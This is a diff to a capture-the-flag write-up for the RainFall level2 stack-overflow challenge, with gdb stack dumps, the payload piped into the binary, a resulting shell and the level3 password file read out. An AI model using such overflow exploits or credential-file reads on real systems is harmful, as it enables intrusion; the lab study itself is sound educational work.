@@ -201,3 +201,30 @@ When we enter `system` function:
 		0xb7e6b067 <system+7>:	mov    esi,DWORD PTR [esp+0x20]
 	(gdb) x/80x $esp
 		0xbffff6e4:	**0xb7e5ebe0**	**0xb7f8cc58**	0xb7e45400	0x00000001
+		0xbffff6f4:	0xbffff784	0xbffff78c	0xb7fdc858	0x00000000
+		0xbffff704:	0xbffff71c	0xbffff78c	0x00000000	0x08048260
+		0xbffff714:	0xb7fd0ff4	0x00000000	0x00000000	0x00000000
+	Breakpoint 12, 0xb7e6b060 in system () from /lib/i386-linux-gnu/libc.so.6
+		Stack level 0, frame at 0xbffff6e8:
+		 eip = 0xb7e6b060 in system; saved eip **0xb7e5ebe0**
+		 called by frame at 0x5454545c
+		 Arglist at 0xbffff6e0, args:
+		 Locals at 0xbffff6e0, Previous frame's sp is 0xbffff6e8
+		 Saved registers:
+		  eip at 0xbffff6e4
+
+Main description is here: https://airman604.medium.com/protostar-stack7-walkthrough-2aa2428be3e0
+
+# Result
+
+	level2@RainFall:~$ vi /tmp/exploit.py
+	level2@RainFall:~$ python /tmp/exploit.py > /tmp/2exp
+	
+	level2@RainFall:~$ cat /tmp/2exp -| ./level2
+	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP>RRRRSSSSTTTT>`�����X��
+	whoami
+	level3
+	cat /home/user/level3/.pass
+	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+Why do we use `cat -` command? Because even if we break the level and call shell, binary is "limited" and can not give us terminal. For that reason we use option of `cat` that helps us to use stdin where shell is called after exploitation.
